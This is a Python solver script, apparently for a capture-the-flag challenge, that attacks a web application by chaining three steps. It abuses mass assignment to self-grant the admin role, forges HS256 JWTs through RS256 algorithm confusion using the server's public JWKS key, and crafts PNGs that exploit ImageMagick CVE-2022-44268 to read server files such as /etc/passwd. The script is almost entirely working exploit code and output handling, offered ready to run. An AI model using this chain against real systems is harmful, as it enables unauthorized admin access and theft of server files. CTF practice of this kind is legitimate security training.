#!/usr/bin/env python3
"""
OnboardX full solver (KPMG CTF, authorized).
Chain: self-onboard (mass-assignment) -> JWT RS256->HS256 alg-confusion -> admin
       -> ImageMagick CVE-2022-44268 (PNG 'profile' tEXt chunk reads a server file into
          the OUTPUT image's "Raw profile type" metadata) -> read that output to exfil.

The idcard output (idcard_4_<uuid4>.png) is UNREADABLE (random name, no preview_url),
so this script hunts a SECOND imagemagick touchpoint whose output is served at a
KNOWN url (the employee directory / ID-photo rendering = X-Powered-By: ImageMagick/6).

Needs: pip install cryptography   (Pillow optional, not required).
Run:   python3 onboardx_solve.py
"""
import ssl, json, base64, hmac, hashlib, uuid, struct, zlib, random, string, re
import urllib.request, urllib.parse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

B = "https://kicyber-d449a9e700a5-onboardx-0-0.chals.io"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def b64u(x): return base64.urlsafe_b64decode(x + "=="*(-len(x) % 4))
def b64(x):  return base64.urlsafe_b64encode(x).decode().rstrip("=")

# ---------- JWT alg-confusion secret from JWKS ----------
_jwks = json.loads(urllib.request.urlopen(B+"/.well-known/jwks.json", context=ctx, timeout=20).read())
_k = _jwks["keys"][0]
_n = int.from_bytes(b64u(_k["n"]), "big"); _e = int.from_bytes(b64u(_k["e"]), "big")
SECRET = rsa.RSAPublicNumbers(_e, _n).public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)  # SPKI, WITH trailing \n
KID = _k["kid"]

def forge(sub, role="admin", username="x"):
    hdr = {"alg":"HS256", "kid":KID, "typ":"JWT"}
    pl  = {"sub":sub, "username":username, "role":role, "iat":1700000000, "exp":1999999999}
    seg = b64(json.dumps(hdr, separators=(",",":")).encode()) + "." + b64(json.dumps(pl, separators=(",",":")).encode())
    return seg + "." + b64(hmac.new(SECRET, seg.encode(), hashlib.sha256).digest())

def _open(req):
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=40); return r.status, dict(r.getheaders()), r.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.getheaders()), (e.read() or b"")
    except Exception as e: return "EXC", {}, str(e).encode()

def register(u, p):
    data = urllib.parse.urlencode({"username":u, "password":p}).encode()
    return _open(urllib.request.Request(B+"/register", data=data, method="POST",
            headers={"Content-Type":"application/x-www-form-urlencoded"}))[0]

def login_session(u, p):
    class NR(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,*a,**k): return None
    op = urllib.request.build_opener(NR, urllib.request.HTTPSHandler(context=ctx))
    data = urllib.parse.urlencode({"username":u, "password":p}).encode()
    req = urllib.request.Request(B+"/login", data=data, method="POST",
            headers={"Content-Type":"application/x-www-form-urlencoded"})
    try: hdrs = op.open(req, timeout=40).getheaders()
    except urllib.error.HTTPError as e: hdrs = e.getheaders()
    ck = {}
    for k,v in hdrs:
        if k.lower()=="set-cookie":
            ck[v.split("=",1)[0].strip()] = v.split("=",1)[1].split(";",1)[0]
    return ck

def _decode_flask_session(val):
    seg = val.split(".")[0]
    raw = b64u(seg[1:] if seg.startswith(".") else seg)
    if seg.startswith("."): raw = zlib.decompress(raw)
    return json.loads(raw)

def me(cookie):
    st,h,b = _open(urllib.request.Request(B+"/api/user/me", headers={"Cookie":cookie}))
    try: return st, json.loads(b)
    except: return st, b.decode("utf-8","replace")

def patch(cookie, data):
    return _open(urllib.request.Request(B+"/api/user/me", data=json.dumps(data).encode(),
            method="PATCH", headers={"Cookie":cookie, "Content-Type":"application/json"}))

def upload(token, content, filename="card.png", ctype="image/png"):
    bnd = "----zq"+uuid.uuid4().hex
    body = ("--"+bnd+"\r\n").encode() + \
           ('Content-Disposition: form-data; name="avatar"; filename="%s"\r\n'%filename).encode() + \
           ("Content-Type: %s\r\n\r\n"%ctype).encode() + content + ("\r\n--"+bnd+"--\r\n").encode()
    return _open(urllib.request.Request(B+"/profile", data=body, method="POST",
            headers={"Cookie":"token="+token, "Content-Type":"multipart/form-data; boundary="+bnd}))[0]

def gen(token, uid):
    st,h,b = _open(urllib.request.Request(B+"/admin/idcard/%s"%uid, method="POST",
            headers={"Cookie":"token="+token}))
    return st, b.decode("utf-8","replace")

def get(path, token=None):
    hh = {"Cookie":"token="+token} if token else {}
    return _open(urllib.request.Request(B+path, headers=hh))

def arm():
    u = "zq_"+"".join(random.choices(string.ascii_lowercase+string.digits, k=8)); p = "Passw0rd!23"
    register(u, p)
    ck = login_session(u, p)
    scookie = "session="+ck.get("session","")
    try: sub = _decode_flask_session(ck["session"])["pending_user_id"]
    except Exception: sub = None
    patch(scookie, {"is_approved":True, "role":"admin"})
    st, mj = me(scookie)
    if sub is None and isinstance(mj, dict): sub = mj["id"]
    tok = forge(sub, "admin", u)
    return u, sub, tok

# ---------- CVE-2022-44268 payload + extractor ----------
def png_chunk(typ, data): return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", zlib.crc32(typ+data) & 0xffffffff)

def make_cve_png(target_path, w=96, h=96):
    sig  = b"\x89PNG\r\n\x1a\n"
    ihdr = png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
    raw  = b"".join(b"\x00" + b"\x30\x60\xc0"*w for _ in range(h))
    idat = png_chunk(b"IDAT", zlib.compress(raw, 9))
    ptext= png_chunk(b"tEXt", b"profile\x00" + target_path.encode())  # keyword 'profile' -> file to read
    return sig + ihdr + ptext + idat + png_chunk(b"IEND", b"")

def extract_raw_profile(png):
    """Return decoded bytes of every 'Raw profile type*' chunk found in a PNG."""
    out = []
    i = 8
    while i + 8 <= len(png):
        ln = struct.unpack(">I", png[i:i+4])[0]; typ = png[i+4:i+8]
        data = png[i+8:i+8+ln]; i += 12 + ln
        if typ in (b"tEXt", b"zTXt", b"iTXt"):
            if typ == b"zTXt":
                kw, rest = data.split(b"\x00", 1)
                text = zlib.decompress(rest[1:])  # skip compression method byte
            elif typ == b"iTXt":
                parts = data.split(b"\x00", 5); kw = parts[0]; text = parts[-1]
            else:
                kw, text = data.split(b"\x00", 1)
            if b"profile" in kw.lower() or b"raw profile" in text[:40].lower():
                # IM 'Raw profile type' text format: "\n<name>\n<len>\n<hex...>\n"
                decoded = None
                try:
                    t = text.decode("latin1").strip()
                    lines = t.split("\n")
                    if len(lines) >= 3:                       # name, length, hex-lines...
                        hexstr = "".join(lines[2:]).replace(" ", "")
                        decoded = bytes.fromhex(hexstr)
                except Exception:
                    decoded = None
                if decoded is None:                            # fallback: longest hex run
                    runs = re.findall(rb"[0-9a-fA-F]{32,}", text)
                    if runs:
                        try: decoded = bytes.fromhex(max(runs, key=len).decode())
                        except Exception: decoded = None
                out.append(decoded if decoded is not None else text)
        if typ == b"IEND": break
    return out

FLAG_RE = re.compile(rb"KPMG_CTF\{[^}]*\}")
def scan_for_flag(blob):
    m = FLAG_RE.search(blob if isinstance(blob, bytes) else blob.encode("utf-8","replace"))
    return m.group(0).decode() if m else None

# candidate server routes that might PROCESS+RETURN an avatar via ImageMagick (readable channel)
IMG_ROUTES = [
    "/static/{av}", "/avatar/{sub}", "/avatar/{av}", "/thumb/{sub}", "/thumb/{av}",
    "/photo/{sub}", "/img/{sub}", "/idcard/{sub}", "/directory/avatar/{sub}",
    "/static/thumbs/{av}", "/static/idcards/{av}", "/static/uploads/thumb_{av}",
    "/profile/photo", "/me/photo", "/static/uploads/idcard_{av}",
]
FLAG_PATHS = ["/etc/passwd", "/flag", "/flag.txt", "/app/flag.txt", "/app/app/flag.txt",
              "flag.txt", "/flag/flag.txt", "/root/flag.txt", "/app/app/flag"]

def main():
    u, sub, tok = arm()
    print(f"[+] armed user={u} sub={sub}")
    st, mj = me("token="+tok); print("    me:", mj)
    print(f"[+] /admin ->", get("/admin", tok)[0])

    # Step A: find a readable ImageMagick-processed image route using an /etc/passwd proof read
    print("\n[*] uploading CVE proof avatar (profile=/etc/passwd) and probing image routes...")
    upload(tok, make_cve_png("/etc/passwd"))
    st, mj = me("token="+tok); av = mj.get("avatar_path","")
    gen(tok, sub)  # also trigger idcard (in case its output is reachable)
    readable = []
    for tmpl in IMG_ROUTES:
        path = tmpl.format(av=av, sub=sub)
        s, h, body = get(path, tok)
        tag = ""
        if s == 200 and body[:8] == b"\x89PNG\r\n\x1a\n":
            profs = extract_raw_profile(body)
            got = any(b"root:" in p for p in profs)
            tag = "  <== PNG served" + ("  *** Raw profile present ***" if profs else "")
            if got: tag += "  *** /etc/passwd READ CONFIRMED ***"
            if profs: readable.append(tmpl)   # store TEMPLATE; avatar name changes later
        if s != 404:
            print(f"    {path:38s} -> {s} {h.get('Content-Type','')} {len(body)}B{tag}")

    if not readable:
        print("\n[!] No route returned an IM-reprocessed PNG with a Raw profile chunk.")
        print("    Next ideas: inspect /directory html for the real img route; check if the")
        print("    directory writes a thumbnail to disk on view; or GET the idcard output.")
        return

    # Step B: pull the flag through the confirmed readable route
    print(f"\n[+] readable IM route(s): {readable}")
    # 'readable' holds route TEMPLATES that yielded a Raw profile chunk for this avatar.
    for fp in FLAG_PATHS:
        upload(tok, make_cve_png(fp))
        st, mj = me("token="+tok); av = mj.get("avatar_path","")
        gen(tok, sub)
        for tmpl in readable:
            path = tmpl.format(av=av, sub=sub)
            s, h, body = get(path, tok)
            for prof in extract_raw_profile(body):
                print(f"    [{fp}] via {path}: {prof[:120]!r}")
                flag = scan_for_flag(prof)
                if flag:
                    print(f"\n[FLAG] {flag}\n"); return

if __name__ == "__main__":
    main()
